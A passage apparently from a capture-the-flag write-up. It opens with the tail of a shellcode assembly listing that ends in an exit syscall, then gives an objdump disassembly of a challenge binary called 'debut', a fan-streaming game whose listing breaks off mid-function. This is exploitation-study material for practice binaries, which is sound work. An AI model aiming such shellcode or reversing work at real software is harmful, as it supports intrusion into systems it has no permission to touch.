1a: b0 e7                   mov    al,0xe7
1c: 0f 05                   syscall
```

## Debut
<details>
<summary>cource code</summary>

```x86asm

debut:     file format elf64-x86-64


Disassembly of section .init:

0000000000001000 <_init>:
    1000:	f3 0f 1e fa          	endbr64 
    1004:	48 83 ec 08          	sub    rsp,0x8
    1008:	48 8b 05 d9 2f 00 00 	mov    rax,QWORD PTR [rip+0x2fd9]        # 3fe8 <__gmon_start__>
    100f:	48 85 c0             	test   rax,rax
    1012:	74 02                	je     1016 <_init+0x16>
    1014:	ff d0                	call   rax
    1016:	48 83 c4 08          	add    rsp,0x8
    101a:	c3                   	ret    

Disassembly of section .plt:

0000000000001020 <.plt>:
    1020:	ff 35 4a 2f 00 00    	push   QWORD PTR [rip+0x2f4a]        # 3f70 <_GLOBAL_OFFSET_TABLE_+0x8>
    1026:	f2 ff 25 4b 2f 00 00 	bnd jmp QWORD PTR [rip+0x2f4b]        # 3f78 <_GLOBAL_OFFSET_TABLE_+0x10>
    102d:	0f 1f 00             	nop    DWORD PTR [rax]
    1030:	f3 0f 1e fa          	endbr64 
    1034:	68 00 00 00 00       	push   0x0
    1039:	f2 e9 e1 ff ff ff    	bnd jmp 1020 <.plt>
    103f:	90                   	nop
    1040:	f3 0f 1e fa          	endbr64 
    1044:	68 01 00 00 00       	push   0x1
    1049:	f2 e9 d1 ff ff ff    	bnd jmp 1020 <.plt>
    104f:	90                   	nop
    1050:	f3 0f 1e fa          	endbr64 
    1054:	68 02 00 00 00       	push   0x2
    1059:	f2 e9 c1 ff ff ff    	bnd jmp 1020 <.plt>
    105f:	90                   	nop
    1060:	f3 0f 1e fa          	endbr64 
    1064:	68 03 00 00 00       	push   0x3
    1069:	f2 e9 b1 ff ff ff    	bnd jmp 1020 <.plt>
    106f:	90                   	nop
    1070:	f3 0f 1e fa          	endbr64 
    1074:	68 04 00 00 00       	push   0x4
    1079:	f2 e9 a1 ff ff ff    	bnd jmp 1020 <.plt>
    107f:	90                   	nop
    1080:	f3 0f 1e fa          	endbr64 
    1084:	68 05 00 00 00       	push   0x5
    1089:	f2 e9 91 ff ff ff    	bnd jmp 1020 <.plt>
    108f:	90                   	nop
    1090:	f3 0f 1e fa          	endbr64 
    1094:	68 06 00 00 00       	push   0x6
    1099:	f2 e9 81 ff ff ff    	bnd jmp 1020 <.plt>
    109f:	90                   	nop
    10a0:	f3 0f 1e fa          	endbr64 
    10a4:	68 07 00 00 00       	push   0x7
    10a9:	f2 e9 71 ff ff ff    	bnd jmp 1020 <.plt>
    10af:	90                   	nop
    10b0:	f3 0f 1e fa          	endbr64 
    10b4:	68 08 00 00 00       	push   0x8
    10b9:	f2 e9 61 ff ff ff    	bnd jmp 1020 <.plt>
    10bf:	90                   	nop
    10c0:	f3 0f 1e fa          	endbr64 
    10c4:	68 09 00 00 00       	push   0x9
    10c9:	f2 e9 51 ff ff ff    	bnd jmp 1020 <.plt>
    10cf:	90                   	nop
    10d0:	f3 0f 1e fa          	endbr64 
    10d4:	68 0a 00 00 00       	push   0xa
    10d9:	f2 e9 41 ff ff ff    	bnd jmp 1020 <.plt>
    10df:	90                   	nop

Disassembly of section .plt.got:

00000000000010e0 <__cxa_finalize@plt>:
    10e0:	f3 0f 1e fa          	endbr64 
    10e4:	f2 ff 25 0d 2f 00 00 	bnd jmp QWORD PTR [rip+0x2f0d]        # 3ff8 <__cxa_finalize@GLIBC_2.2.5>
    10eb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

Disassembly of section .plt.sec:

00000000000010f0 <strcpy@plt>:
    10f0:	f3 0f 1e fa          	endbr64 
    10f4:	f2 ff 25 85 2e 00 00 	bnd jmp QWORD PTR [rip+0x2e85]        # 3f80 <strcpy@GLIBC_2.2.5>
    10fb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001100 <puts@plt>:
    1100:	f3 0f 1e fa          	endbr64 
    1104:	f2 ff 25 7d 2e 00 00 	bnd jmp QWORD PTR [rip+0x2e7d]        # 3f88 <puts@GLIBC_2.2.5>
    110b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001110 <write@plt>:
    1110:	f3 0f 1e fa          	endbr64 
    1114:	f2 ff 25 75 2e 00 00 	bnd jmp QWORD PTR [rip+0x2e75]        # 3f90 <write@GLIBC_2.2.5>
    111b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001120 <__stack_chk_fail@plt>:
    1120:	f3 0f 1e fa          	endbr64 
    1124:	f2 ff 25 6d 2e 00 00 	bnd jmp QWORD PTR [rip+0x2e6d]        # 3f98 <__stack_chk_fail@GLIBC_2.4>
    112b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001130 <printf@plt>:
    1130:	f3 0f 1e fa          	endbr64 
    1134:	f2 ff 25 65 2e 00 00 	bnd jmp QWORD PTR [rip+0x2e65]        # 3fa0 <printf@GLIBC_2.2.5>
    113b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001140 <read@plt>:
    1140:	f3 0f 1e fa          	endbr64 
    1144:	f2 ff 25 5d 2e 00 00 	bnd jmp QWORD PTR [rip+0x2e5d]        # 3fa8 <read@GLIBC_2.2.5>
    114b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001150 <getchar@plt>:
    1150:	f3 0f 1e fa          	endbr64 
    1154:	f2 ff 25 55 2e 00 00 	bnd jmp QWORD PTR [rip+0x2e55]        # 3fb0 <getchar@GLIBC_2.2.5>
    115b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001160 <setvbuf@plt>:
    1160:	f3 0f 1e fa          	endbr64 
    1164:	f2 ff 25 4d 2e 00 00 	bnd jmp QWORD PTR [rip+0x2e4d]        # 3fb8 <setvbuf@GLIBC_2.2.5>
    116b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001170 <atoi@plt>:
    1170:	f3 0f 1e fa          	endbr64 
    1174:	f2 ff 25 45 2e 00 00 	bnd jmp QWORD PTR [rip+0x2e45]        # 3fc0 <atoi@GLIBC_2.2.5>
    117b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001180 <exit@plt>:
    1180:	f3 0f 1e fa          	endbr64 
    1184:	f2 ff 25 3d 2e 00 00 	bnd jmp QWORD PTR [rip+0x2e3d]        # 3fc8 <exit@GLIBC_2.2.5>
    118b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001190 <sleep@plt>:
    1190:	f3 0f 1e fa          	endbr64 
    1194:	f2 ff 25 35 2e 00 00 	bnd jmp QWORD PTR [rip+0x2e35]        # 3fd0 <sleep@GLIBC_2.2.5>
    119b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

Disassembly of section .text:

00000000000011a0 <_start>:
    11a0:	f3 0f 1e fa          	endbr64 
    11a4:	31 ed                	xor    ebp,ebp
    11a6:	49 89 d1             	mov    r9,rdx
    11a9:	5e                   	pop    rsi
    11aa:	48 89 e2             	mov    rdx,rsp
    11ad:	48 83 e4 f0          	and    rsp,0xfffffffffffffff0
    11b1:	50                   	push   rax
    11b2:	54                   	push   rsp
    11b3:	4c 8d 05 16 0b 00 00 	lea    r8,[rip+0xb16]        # 1cd0 <__libc_csu_fini>
    11ba:	48 8d 0d 9f 0a 00 00 	lea    rcx,[rip+0xa9f]        # 1c60 <__libc_csu_init>
    11c1:	48 8d 3d ac 09 00 00 	lea    rdi,[rip+0x9ac]        # 1b74 <main>
    11c8:	ff 15 12 2e 00 00    	call   QWORD PTR [rip+0x2e12]        # 3fe0 <__libc_start_main@GLIBC_2.2.5>
    11ce:	f4                   	hlt    
    11cf:	90                   	nop

00000000000011d0 <deregister_tm_clones>:
    11d0:	48 8d 3d 39 2e 00 00 	lea    rdi,[rip+0x2e39]        # 4010 <__TMC_END__>
    11d7:	48 8d 05 32 2e 00 00 	lea    rax,[rip+0x2e32]        # 4010 <__TMC_END__>
    11de:	48 39 f8             	cmp    rax,rdi
    11e1:	74 15                	je     11f8 <deregister_tm_clones+0x28>
    11e3:	48 8b 05 ee 2d 00 00 	mov    rax,QWORD PTR [rip+0x2dee]        # 3fd8 <_ITM_deregisterTMCloneTable>
    11ea:	48 85 c0             	test   rax,rax
    11ed:	74 09                	je     11f8 <deregister_tm_clones+0x28>
    11ef:	ff e0                	jmp    rax
    11f1:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
    11f8:	c3                   	ret    
    11f9:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]

0000000000001200 <register_tm_clones>:
    1200:	48 8d 3d 09 2e 00 00 	lea    rdi,[rip+0x2e09]        # 4010 <__TMC_END__>
    1207:	48 8d 35 02 2e 00 00 	lea    rsi,[rip+0x2e02]        # 4010 <__TMC_END__>
    120e:	48 29 fe             	sub    rsi,rdi
    1211:	48 89 f0             	mov    rax,rsi
    1214:	48 c1 ee 3f          	shr    rsi,0x3f
    1218:	48 c1 f8 03          	sar    rax,0x3
    121c:	48 01 c6             	add    rsi,rax
    121f:	48 d1 fe             	sar    rsi,1
    1222:	74 14                	je     1238 <register_tm_clones+0x38>
    1224:	48 8b 05 c5 2d 00 00 	mov    rax,QWORD PTR [rip+0x2dc5]        # 3ff0 <_ITM_registerTMCloneTable>
    122b:	48 85 c0             	test   rax,rax
    122e:	74 08                	je     1238 <register_tm_clones+0x38>
    1230:	ff e0                	jmp    rax
    1232:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]
    1238:	c3                   	ret    
    1239:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]

0000000000001240 <__do_global_dtors_aux>:
    1240:	f3 0f 1e fa          	endbr64 
    1244:	80 3d fd 2d 00 00 00 	cmp    BYTE PTR [rip+0x2dfd],0x0        # 4048 <completed.8060>
    124b:	75 2b                	jne    1278 <__do_global_dtors_aux+0x38>
    124d:	55                   	push   rbp
    124e:	48 83 3d a2 2d 00 00 	cmp    QWORD PTR [rip+0x2da2],0x0        # 3ff8 <__cxa_finalize@GLIBC_2.2.5>
    1255:	00 
    1256:	48 89 e5             	mov    rbp,rsp
    1259:	74 0c                	je     1267 <__do_global_dtors_aux+0x27>
    125b:	48 8b 3d a6 2d 00 00 	mov    rdi,QWORD PTR [rip+0x2da6]        # 4008 <__dso_handle>
    1262:	e8 79 fe ff ff       	call   10e0 <__cxa_finalize@plt>
    1267:	e8 64 ff ff ff       	call   11d0 <deregister_tm_clones>
    126c:	c6 05 d5 2d 00 00 01 	mov    BYTE PTR [rip+0x2dd5],0x1        # 4048 <completed.8060>
    1273:	5d                   	pop    rbp
    1274:	c3                   	ret    
    1275:	0f 1f 00             	nop    DWORD PTR [rax]
    1278:	c3                   	ret    
    1279:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]

0000000000001280 <frame_dummy>:
    1280:	f3 0f 1e fa          	endbr64 
    1284:	e9 77 ff ff ff       	jmp    1200 <register_tm_clones>

0000000000001289 <init>:
    1289:	f3 0f 1e fa          	endbr64 
    128d:	55                   	push   rbp
    128e:	48 89 e5             	mov    rbp,rsp
    1291:	48 8b 05 98 2d 00 00 	mov    rax,QWORD PTR [rip+0x2d98]        # 4030 <stdin@@GLIBC_2.2.5>
    1298:	b9 00 00 00 00       	mov    ecx,0x0
    129d:	ba 02 00 00 00       	mov    edx,0x2
    12a2:	be 00 00 00 00       	mov    esi,0x0
    12a7:	48 89 c7             	mov    rdi,rax
    12aa:	e8 b1 fe ff ff       	call   1160 <setvbuf@plt>
    12af:	48 8b 05 6a 2d 00 00 	mov    rax,QWORD PTR [rip+0x2d6a]        # 4020 <stdout@@GLIBC_2.2.5>
    12b6:	b9 00 00 00 00       	mov    ecx,0x0
    12bb:	ba 02 00 00 00       	mov    edx,0x2
    12c0:	be 00 00 00 00       	mov    esi,0x0
    12c5:	48 89 c7             	mov    rdi,rax
    12c8:	e8 93 fe ff ff       	call   1160 <setvbuf@plt>
    12cd:	48 8b 05 6c 2d 00 00 	mov    rax,QWORD PTR [rip+0x2d6c]        # 4040 <stderr@@GLIBC_2.2.5>
    12d4:	b9 00 00 00 00       	mov    ecx,0x0
    12d9:	ba 02 00 00 00       	mov    edx,0x2
    12de:	be 00 00 00 00       	mov    esi,0x0
    12e3:	48 89 c7             	mov    rdi,rax
    12e6:	e8 75 fe ff ff       	call   1160 <setvbuf@plt>
    12eb:	90                   	nop
    12ec:	5d                   	pop    rbp
    12ed:	c3                   	ret    

00000000000012ee <read_int>:
    12ee:	f3 0f 1e fa          	endbr64 
    12f2:	55                   	push   rbp
    12f3:	48 89 e5             	mov    rbp,rsp
    12f6:	48 83 ec 20          	sub    rsp,0x20
    12fa:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    1301:	00 00 
    1303:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    1307:	31 c0                	xor    eax,eax
    1309:	48 8d 45 e0          	lea    rax,[rbp-0x20]
    130d:	ba 10 00 00 00       	mov    edx,0x10
    1312:	48 89 c6             	mov    rsi,rax
    1315:	bf 00 00 00 00       	mov    edi,0x0
    131a:	e8 21 fe ff ff       	call   1140 <read@plt>
    131f:	48 8d 45 e0          	lea    rax,[rbp-0x20]
    1323:	48 89 c7             	mov    rdi,rax
    1326:	e8 45 fe ff ff       	call   1170 <atoi@plt>
    132b:	48 8b 4d f8          	mov    rcx,QWORD PTR [rbp-0x8]
    132f:	64 48 33 0c 25 28 00 	xor    rcx,QWORD PTR fs:0x28
    1336:	00 00 
    1338:	74 05                	je     133f <read_int+0x51>
    133a:	e8 e1 fd ff ff       	call   1120 <__stack_chk_fail@plt>
    133f:	c9                   	leave  
    1340:	c3                   	ret    

0000000000001341 <menu>:
    1341:	f3 0f 1e fa          	endbr64 
    1345:	55                   	push   rbp
    1346:	48 89 e5             	mov    rbp,rsp
    1349:	48 8d 3d b8 0c 00 00 	lea    rdi,[rip+0xcb8]        # 2008 <_IO_stdin_used+0x8>
    1350:	e8 ab fd ff ff       	call   1100 <puts@plt>
    1355:	48 8d 35 24 2d 00 00 	lea    rsi,[rip+0x2d24]        # 4080 <name>
    135c:	48 8d 3d ba 0c 00 00 	lea    rdi,[rip+0xcba]        # 201d <_IO_stdin_used+0x1d>
    1363:	b8 00 00 00 00       	mov    eax,0x0
    1368:	e8 c3 fd ff ff       	call   1130 <printf@plt>
    136d:	48 8b 05 dc 2c 00 00 	mov    rax,QWORD PTR [rip+0x2cdc]        # 4050 <fans>
    1374:	48 89 c6             	mov    rsi,rax
    1377:	48 8d 3d a9 0c 00 00 	lea    rdi,[rip+0xca9]        # 2027 <_IO_stdin_used+0x27>
    137e:	b8 00 00 00 00       	mov    eax,0x0
    1383:	e8 a8 fd ff ff       	call   1130 <printf@plt>
    1388:	48 8b 05 c9 2c 00 00 	mov    rax,QWORD PTR [rip+0x2cc9]        # 4058 <sc>
    138f:	48 89 c6             	mov    rsi,rax
    1392:	48 8d 3d 9a 0c 00 00 	lea    rdi,[rip+0xc9a]        # 2033 <_IO_stdin_used+0x33>
    1399:	b8 00 00 00 00       	mov    eax,0x0
    139e:	e8 8d fd ff ff       	call   1130 <printf@plt>
    13a3:	8b 05 cb 2c 00 00    	mov    eax,DWORD PTR [rip+0x2ccb]        # 4074 <stickers>
    13a9:	89 c6                	mov    esi,eax
    13ab:	48 8d 3d 8b 0c 00 00 	lea    rdi,[rip+0xc8b]        # 203d <_IO_stdin_used+0x3d>
    13b2:	b8 00 00 00 00       	mov    eax,0x0
    13b7:	e8 74 fd ff ff       	call   1130 <printf@plt>
    13bc:	8b 05 9e 2c 00 00    	mov    eax,DWORD PTR [rip+0x2c9e]        # 4060 <fan_2x>
    13c2:	85 c0                	test   eax,eax
    13c4:	74 09                	je     13cf <menu+0x8e>
    13c6:	48 8d 05 88 0c 00 00 	lea    rax,[rip+0xc88]        # 2055 <_IO_stdin_used+0x55>
    13cd:	eb 07                	jmp    13d6 <menu+0x95>
    13cf:	48 8d 05 82 0c 00 00 	lea    rax,[rip+0xc82]        # 2058 <_IO_stdin_used+0x58>
    13d6:	48 89 c6             	mov    rsi,rax
    13d9:	48 8d 3d 7c 0c 00 00 	lea    rdi,[rip+0xc7c]        # 205c <_IO_stdin_used+0x5c>
    13e0:	b8 00 00 00 00       	mov    eax,0x0
    13e5:	e8 46 fd ff ff       	call   1130 <printf@plt>
    13ea:	8b 05 74 2c 00 00    	mov    eax,DWORD PTR [rip+0x2c74]        # 4064 <fan_5x>
    13f0:	85 c0                	test   eax,eax
    13f2:	74 09                	je     13fd <menu+0xbc>
    13f4:	48 8d 05 5a 0c 00 00 	lea    rax,[rip+0xc5a]        # 2055 <_IO_stdin_used+0x55>
    13fb:	eb 07                	jmp    1404 <menu+0xc3>
    13fd:	48 8d 05 54 0c 00 00 	lea    rax,[rip+0xc54]        # 2058 <_IO_stdin_used+0x58>
    1404:	48 89 c6             	mov    rsi,rax
    1407:	48 8d 3d 5b 0c 00 00 	lea    rdi,[rip+0xc5b]        # 2069 <_IO_stdin_used+0x69>
    140e:	b8 00 00 00 00       	mov    eax,0x0
    1413:	e8 18 fd ff ff       	call   1130 <printf@plt>
    1418:	8b 05 4a 2c 00 00    	mov    eax,DWORD PTR [rip+0x2c4a]        # 4068 <fan_10x>
    141e:	85 c0                	test   eax,eax
    1420:	74 09                	je     142b <menu+0xea>
    1422:	48 8d 05 2c 0c 00 00 	lea    rax,[rip+0xc2c]        # 2055 <_IO_stdin_used+0x55>
    1429:	eb 07                	jmp    1432 <menu+0xf1>
    142b:	48 8d 05 26 0c 00 00 	lea    rax,[rip+0xc26]        # 2058 <_IO_stdin_used+0x58>
    1432:	48 89 c6             	mov    rsi,rax
    1435:	48 8d 3d 3a 0c 00 00 	lea    rdi,[rip+0xc3a]        # 2076 <_IO_stdin_used+0x76>
    143c:	b8 00 00 00 00       	mov    eax,0x0
    1441:	e8 ea fc ff ff       	call   1130 <printf@plt>
    1446:	8b 05 20 2c 00 00    	mov    eax,DWORD PTR [rip+0x2c20]        # 406c <fan_50x>
    144c:	85 c0                	test   eax,eax
    144e:	74 09                	je     1459 <menu+0x118>
    1450:	48 8d 05 fe 0b 00 00 	lea    rax,[rip+0xbfe]        # 2055 <_IO_stdin_used+0x55>
    1457:	eb 07                	jmp    1460 <menu+0x11f>
    1459:	48 8d 05 f8 0b 00 00 	lea    rax,[rip+0xbf8]        # 2058 <_IO_stdin_used+0x58>
    1460:	48 89 c6             	mov    rsi,rax
    1463:	48 8d 3d 1a 0c 00 00 	lea    rdi,[rip+0xc1a]        # 2084 <_IO_stdin_used+0x84>
    146a:	b8 00 00 00 00       	mov    eax,0x0
    146f:	e8 bc fc ff ff       	call   1130 <printf@plt>
    1474:	8b 05 f6 2b 00 00    	mov    eax,DWORD PTR [rip+0x2bf6]        # 4070 <fan_100x>
    147a:	85 c0                	test   eax,eax
    147c:	74 09                	je     1487 <menu+0x146>
    147e:	48 8d 05 d0 0b 00 00 	lea    rax,[rip+0xbd0]        # 2055 <_IO_stdin_used+0x55>
    1485:	eb 07                	jmp    148e <menu+0x14d>
    1487:	48 8d 05 ca 0b 00 00 	lea    rax,[rip+0xbca]        # 2058 <_IO_stdin_used+0x58>
    148e:	48 89 c6             	mov    rsi,rax
    1491:	48 8d 3d fa 0b 00 00 	lea    rdi,[rip+0xbfa]        # 2092 <_IO_stdin_used+0x92>
    1498:	b8 00 00 00 00       	mov    eax,0x0
    149d:	e8 8e fc ff ff       	call   1130 <printf@plt>
    14a2:	48 8d 3d f8 0b 00 00 	lea    rdi,[rip+0xbf8]        # 20a1 <_IO_stdin_used+0xa1>
    14a9:	e8 52 fc ff ff       	call   1100 <puts@plt>
    14ae:	48 8d 3d 01 0c 00 00 	lea    rdi,[rip+0xc01]        # 20b6 <_IO_stdin_used+0xb6>
    14b5:	e8 46 fc ff ff       	call   1100 <puts@plt>
    14ba:	48 8d 3d f6 0b 00 00 	lea    rdi,[rip+0xbf6]        # 20b7 <_IO_stdin_used+0xb7>
    14c1:	e8 3a fc ff ff       	call   1100 <puts@plt>
    14c6:	48 8d 3d 02 0c 00 00 	lea    rdi,[rip+0xc02]        # 20cf <_IO_stdin_used+0xcf>
    14cd:	e8 2e fc ff ff       	call   1100 <puts@plt>
    14d2:	48 8d 3d 06 0c 00 00 	lea    rdi,[rip+0xc06]        # 20df <_IO_stdin_used+0xdf>
    14d9:	e8 22 fc ff ff       	call   1100 <puts@plt>
    14de:	48 8d 3d 06 0c 00 00 	lea    rdi,[rip+0xc06]        # 20eb <_IO_stdin_used+0xeb>
    14e5:	e8 16 fc ff ff       	call   1100 <puts@plt>
    14ea:	48 8d 3d 0b 0c 00 00 	lea    rdi,[rip+0xc0b]        # 20fc <_IO_stdin_used+0xfc>
    14f1:	e8 0a fc ff ff       	call   1100 <puts@plt>
    14f6:	ba 02 00 00 00       	mov    edx,0x2
    14fb:	48 8d 35 02 0c 00 00 	lea    rsi,[rip+0xc02]        # 2104 <_IO_stdin_used+0x104>
    1502:	bf 01 00 00 00       	mov    edi,0x1
    1507:	e8 04 fc ff ff       	call   1110 <write@plt>
    150c:	90                   	nop
    150d:	5d                   	pop    rbp
    150e:	c3                   	ret    

000000000000150f <stream>:
    150f:	f3 0f 1e fa          	endbr64 
    1513:	55                   	push   rbp
    1514:	48 89 e5             	mov    rbp,rsp
    1517:	48 83 ec 10          	sub    rsp,0x10
    151b:	48 c7 45 f8 64 00 00 	mov    QWORD PTR [rbp-0x8],0x64
    1522:	00 
    1523:	8b 05 37 2b 00 00    	mov    eax,DWORD PTR [rip+0x2b37]        # 4060 <fan_2x>
    1529:	85 c0                	test   eax,eax
    152b:	74 04                	je     1531 <stream+0x22>
    152d:	48 d1 65 f8          	shl    QWORD PTR [rbp-0x8],1
    1531:	8b 05 2d 2b 00 00    	mov    eax,DWORD PTR [rip+0x2b2d]        # 4064 <fan_5x>
    1537:	85 c0                	test   eax,eax
    1539:	74 12                	je     154d <stream+0x3e>
    153b:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
    153f:	48 89 d0             	mov    rax,rdx
    1542:	48 c1 e0 02          	shl    rax,0x2
    1546:	48 01 d0             	add    rax,rdx
    1549:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    154d:	8b 05 15 2b 00 00    	mov    eax,DWORD PTR [rip+0x2b15]        # 4068 <fan_10x>
    1553:	85 c0                	test   eax,eax
    1555:	74 15                	je     156c <stream+0x5d>
    1557:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
    155b:	48 89 d0             	mov    rax,rdx
    155e:	48 c1 e0 02          	shl    rax,0x2
    1562:	48 01 d0             	add    rax,rdx
    1565:	48 01 c0             	add    rax,rax
    1568:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    156c:	8b 05 fa 2a 00 00    	mov    eax,DWORD PTR [rip+0x2afa]        # 406c <fan_50x>
    1572:	85 c0                	test   eax,eax
    1574:	74 20                	je     1596 <stream+0x87>
    1576:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
    157a:	48 89 d0             	mov    rax,rdx
    157d:	48 c1 e0 02          	shl    rax,0x2
    1581:	48 01 d0             	add    rax,rdx
    1584:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
    158b:	00 
    158c:	48 01 d0             	add    rax,rdx
    158f:	48 01 c0             	add    rax,rax
    1592:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    1596:	8b 05 d4 2a 00 00    	mov    eax,DWORD PTR [rip+0x2ad4]        # 4070 <fan_100x>
    159c:	85 c0                	test   eax,eax
    159e:	74 21                	je     15c1 <stream+0xb2>
    15a0:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
    15a4:	48 89 d0             	mov    rax,rdx
    15a7:	48 c1 e0 02          	shl    rax,0x2
    15ab:	48 01 d0             	add    rax,rdx
    15ae:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
    15b5:	00 
    15b6:	48 01 d0             	add    rax,rdx
    15b9:	48 c1 e0 02          	shl    rax,0x2
    15bd:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    15c1:	48 8d 3d 3f 0b 00 00 	lea    rdi,[rip+0xb3f]        # 2107 <_IO_stdin_used+0x107>
    15c8:	e8 33 fb ff ff       	call   1100 <puts@plt>
    15cd:	bf 01 00 00 00       	mov    edi,0x1
    15d2:	e8 b9 fb ff ff       	call   1190 <sleep@plt>
    15d7:	48 8b 15 72 2a 00 00 	mov    rdx,QWORD PTR [rip+0x2a72]        # 4050 <fans>
    15de:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
    15e2:	48 01 d0             	add    rax,rdx
    15e5:	48 89 05 64 2a 00 00 	mov    QWORD PTR [rip+0x2a64],rax        # 4050 <fans>
    15ec:	8b 05 82 2a 00 00    	mov    eax,DWORD PTR [rip+0x2a82]        # 4074 <stickers>
    15f2:	85 c0                	test   eax,eax
    15f4:	0f 84 80 00 00 00    	je     167a <stream+0x16b>
    15fa:	48 8b 05 57 2a 00 00 	mov    rax,QWORD PTR [rip+0x2a57]        # 4058 <sc>
    1601:	48 85 c0             	test   rax,rax
    1604:	78 07                	js     160d <stream+0xfe>
    1606:	f2 48 0f 2a c0       	cvtsi2sd xmm0,rax
    160b:	eb 15                	jmp    1622 <stream+0x113>
    160d:	48 89 c2             	mov    rdx,rax
    1610:	48 d1 ea             	shr    rdx,1
    1613:	83 e0 01             	and    eax,0x1
    1616:	48 09 c2             	or     rdx,rax
    1619:	f2 48 0f 2a c2       	cvtsi2sd xmm0,rdx
    161e:	f2 0f 58 c0          	addsd  xmm0,xmm0
    1622:	8b 05 4c 2a 00 00    	mov    eax,DWORD PTR [rip+0x2a4c]        # 4074 <stickers>
    1628:	69 c0 e8 03 00 00    	imul   eax,eax,0x3e8
    162e:	f2 0f 2a d0          	cvtsi2sd xmm2,eax
    1632:	f2 0f 10 0d 36 0e 00 	movsd  xmm1,QWORD PTR [rip+0xe36]        # 2470 <_IO_stdin_used+0x470>
    1639:	00 
    163a:	f2 0f 59 ca          	mulsd  xmm1,xmm2
    163e:	f2 0f 58 c1          	addsd  xmm0,xmm1
    1642:	66 0f 2f 05 2e 0e 00 	comisd xmm0,QWORD PTR [rip+0xe2e]        # 2478 <_IO_stdin_used+0x478>
    1649:	00 
    164a:	73 07                	jae    1653 <stream+0x144>
    164c:	f2 48 0f 2c c0       	cvttsd2si rax,xmm0
    1651:	eb 1e                	jmp    1671 <stream+0x162>
    1653:	f2 0f 10 0d 1d 0e 00 	movsd  xmm1,QWORD PTR [rip+0xe1d]        # 2478 <_IO_stdin_used+0x478>
    165a:	00 
    165b:	f2 0f 5c c1          	subsd  xmm0,xmm1
    165f:	f2 48 0f 2c c0       	cvttsd2si rax,xmm0
    1664:	48 ba 00 00 00 00 00 	movabs rdx,0x8000000000000000
    166b:	00 00 80 
    166e:	48 31 d0             	xor    rax,rdx
    1671:	48 89 05 e0 29 00 00 	mov    QWORD PTR [rip+0x29e0],rax        # 4058 <sc>
    1678:	eb 14                	jmp    168e <stream+0x17f>
    167a:	48 8b 05 d7 29 00 00 	mov    rax,QWORD PTR [rip+0x29d7]        # 4058 <sc>
    1681:	48 05 e8 03 00 00    	add    rax,0x3e8
    1687:	48 89 05 ca 29 00 00 	mov    QWORD PTR [rip+0x29ca],rax        # 4058 <sc>
    168e:	90                   	nop
    168f:	c9                   	leave  
    1690:	c3                   	ret    

0000000000001691 <shopping>:
    1691:	f3 0f 1e fa          	endbr64 
    1695:	55                   	push   rbp
    1696:	48 89 e5             	mov    rbp,rsp
    1699:	48 83 ec 10          	sub    rsp,0x10
    169d:	48 8d 3d 76 0a 00 00 	lea    rdi,[rip+0xa76]        # 211a <_IO_stdin_used+0x11a>
    16a4:	e8 57 fa ff ff       	call   1100 <puts@plt>
    16a9:	ba 02 00 00 00       	mov    edx,0x2
    16ae:	48 8d 35 4f 0a 00 00 	lea    rsi,[rip+0xa4f]        # 2104 <_IO_stdin_used+0x104>
    16b5:	bf 01 00 00 00       	mov    edi,0x1
    16ba:	e8 51 fa ff ff       	call   1110 <write@plt>
    16bf:	e8 8c fa ff ff       	call   1150 <getchar@plt>
    16c4:	88 45 f3             	mov    BYTE PTR [rbp-0xd],al
    16c7:	80 7d f3 42          	cmp    BYTE PTR [rbp-0xd],0x42
    16cb:	74 0a                	je     16d7 <shopping+0x46>
    16cd:	80 7d f3 62          	cmp    BYTE PTR [rbp-0xd],0x62
    16d1:	0f 85 ed 02 00 00    	jne    19c4 <shopping+0x333>
    16d7:	48 8d 3d 4e 0a 00 00 	lea    rdi,[rip+0xa4e]        # 212c <_IO_stdin_used+0x12c>
    16de:	e8 1d fa ff ff       	call   1100 <puts@plt>
    16e3:	48 8d 3d 56 0a 00 00 	lea    rdi,[rip+0xa56]        # 2140 <_IO_stdin_used+0x140>
    16ea:	e8 11 fa ff ff       	call   1100 <puts@plt>
    16ef:	48 8d 3d 82 0a 00 00 	lea    rdi,[rip+0xa82]        # 2178 <_IO_stdin_used+0x178>
    16f6:	e8 05 fa ff ff       	call   1100 <puts@plt>
    16fb:	48 8d 3d ae 0a 00 00 	lea    rdi,[rip+0xaae]        # 21b0 <_IO_stdin_used+0x1b0>
    1702:	e8 f9 f9 ff ff       	call   1100 <puts@plt>
    1707:	48 8d 3d da 0a 00 00 	lea    rdi,[rip+0xada]        # 21e8 <_IO_stdin_used+0x1e8>
